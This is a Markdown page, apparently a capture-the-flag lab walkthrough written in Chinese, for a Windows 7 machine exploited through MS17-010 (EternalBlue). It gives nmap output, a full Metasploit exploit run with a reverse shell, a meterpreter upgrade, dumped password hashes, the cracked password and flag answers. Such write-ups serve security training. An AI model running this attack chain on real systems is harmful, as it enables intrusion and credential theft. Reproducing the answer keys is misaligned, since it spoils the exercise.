@@ -1,0 +1,261 @@
+---
+sidebar_position: 1
+tags: [Easy, Windows, CVE-2017-0146]
+title: Blue
+description: Windows 永恒之蓝漏洞介绍
+---
+# Blue
+## 端口扫描
+> 因为 Windows 防火墙默认不回显 ICMP 请求所以需要使用 -Pn 选项
+
+```bash
+root@ip-10-10-158-144:~# nmap -sT -p- --min-rate 1000 -Pn  10.10.75.105
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2023-08-01 11:16 BST
+Nmap scan report for ip-10-10-75-105.eu-west-1.compute.internal (10.10.75.105)
+Host is up (0.0032s latency).
+Not shown: 65526 closed ports
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49158/tcp open  unknown
+49160/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 38.76 seconds
+```
+## ms17-010
+直接使用 MSF 进行攻击就可以了, 永恒之蓝漏洞都是老漏洞了, 配置完成之后直接运行就可以了
+```bash showLineNumbers
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.75.105
+RHOSTS => 10.10.75.105
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.75.105     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded
+                                             Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Stan
+                                             dard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 tar
+                                             get machines.
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.158.144    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.10.158.144:4444 
+[*] 10.10.75.105:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.75.105:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.75.105:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.75.105:445 - The target is vulnerable.
+[*] 10.10.75.105:445 - Connecting to target for exploitation.
+[+] 10.10.75.105:445 - Connection established for exploitation.
+[+] 10.10.75.105:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.75.105:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.75.105:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.75.105:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.75.105:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.75.105:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.75.105:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.75.105:445 - Sending all but last fragment of exploit packet
+[*] 10.10.75.105:445 - Starting non-paged pool grooming
+[+] 10.10.75.105:445 - Sending SMBv2 buffers
+[+] 10.10.75.105:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.75.105:445 - Sending final SMBv2 buffers.
+[*] 10.10.75.105:445 - Sending last fragment of exploit packet!
+[*] 10.10.75.105:445 - Receiving response from exploit packet
+[+] 10.10.75.105:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.75.105:445 - Sending egg to corrupted connection.
+[*] 10.10.75.105:445 - Triggering free of corrupted buffer.
+[*] Sending stage (336 bytes) to 10.10.75.105
+[+] 10.10.75.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.75.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.75.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Command shell session 1 opened (10.10.158.144:4444 -> 10.10.75.105:49197) at 2023-08-01 11:24:37 +0100
+
+
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+-----
+          
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+## Flag
+### Task1
+- How many ports are open with a port number under 1000? `3`
+- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) `Ms17-010`
+### Task2
+- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)  `exploit/windows/smb/ms17_010_eternalblue`
+- Show options and set the one required value. What is the name of this value? (All caps for submission)  `RHOSTS`
+
+### Task3
+- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)  `post/multi/manage/shell_to_meterpreter`
+- Select this (use MODULE_PATH). Show options, what option are we required to change? `SESSION`
+
+### Task4
+```bash
+# 保存当前会话
+msf6 post(windows/gather/smart_hashdump) > use post/multi/manage/shell_to_meterpreter
+msf6 post(multi/manage/shell_to_meterpreter) > options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
+SESSION => 1
+msf6 post(multi/manage/shell_to_meterpreter) > run
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                                Connection
+  --  ----  ----                     -----------                                                                ----------
+  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Mic  10.10.158.144:4444 -> 10.10.75.105:49197 (10.10.75.105)
+                                     ros...
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                                               10.10.158.144:4433 -> 10.10.75.105:49217 (10.10.75.105)
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 2
+[*] Starting interaction with 2...
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+- Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? `Jon`
+    
+- Copy this password hash to a file and research how to crack it. What is the cracked password? `alqfna22`
+
+### Task5
+```bash
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  02:27 PM                24 flag1.txt
+07/13/2009  10:20 PM    <DIR>          PerfLogs
+04/12/2011  03:28 AM    <DIR>          Program Files
+03/17/2019  05:28 PM    <DIR>          Program Files (x86)
+12/12/2018  10:13 PM    <DIR>          Users
+03/17/2019  05:36 PM    <DIR>          Windows
+               1 File(s)             24 bytes
+               5 Dir(s)  20,439,040,000 bytes free
+
+C:\>type flag1.txt
+type flag1.txt
+flag{access_the_machine}
+
+C:\Windows\System32\config>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Windows\System32\config
+
+08/01/2023  05:03 AM    <DIR>          .
+08/01/2023  05:03 AM    <DIR>          ..
+12/12/2018  06:00 PM            28,672 BCD-Template
+08/01/2023  05:12 AM        18,087,936 COMPONENTS
+08/01/2023  05:32 AM           262,144 DEFAULT
+03/17/2019  02:32 PM                34 flag2.txt
+07/13/2009  09:34 PM    <DIR>          Journal
+08/01/2023  05:32 AM    <DIR>          RegBack
+03/17/2019  03:05 PM           262,144 SAM
+08/01/2023  05:13 AM           262,144 SECURITY
+08/01/2023  05:39 AM        40,632,320 SOFTWARE
+08/01/2023  05:47 AM        12,582,912 SYSTEM
+11/20/2010  09:41 PM    <DIR>          systemprofile
+12/12/2018  06:03 PM    <DIR>          TxR
+               8 File(s)     72,118,306 bytes
+               6 Dir(s)  20,439,040,000 bytes free
+
+C:\Windows\System32\config>type flag2.txt
+type flag2.txt
+flag{sam_database_elevated_access}
+
+C:\Users\Jon\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Users\Jon\Documents
+
+12/12/2018  10:49 PM    <DIR>          .
+12/12/2018  10:49 PM    <DIR>          ..
+03/17/2019  02:26 PM                37 flag3.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  20,439,040,000 bytes free
+
+C:\Users\Jon\Documents>type flag3.txt
+type flag3.txt
+flag{admin_documents_can_be_valuable}
+```
+- Flag1? *This flag can be found at the system root.* `flag{access_the_machine}`
+- Flag2? *This flag can be found at the location where passwords are stored within Windows.* `flag{sam_database_elevated_access}`
+- flag3? *This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.* `flag{admin_documents_can_be_valuable}`
